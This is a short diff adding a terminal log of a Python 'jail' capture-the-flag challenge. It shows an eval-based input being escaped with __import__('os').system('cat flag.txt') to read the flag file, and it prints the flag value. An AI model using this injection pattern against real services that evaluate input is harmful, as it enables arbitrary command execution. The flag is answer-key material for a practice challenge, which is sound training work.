@@ -1,0 +1,7 @@
+$ python3 jail.py 
+>>> print(eval(input()))
+print(eval(input()))
+__import__("os").system("cat flag.txt")
+HTU{c7f_pl4y3r}
+0
+>>>
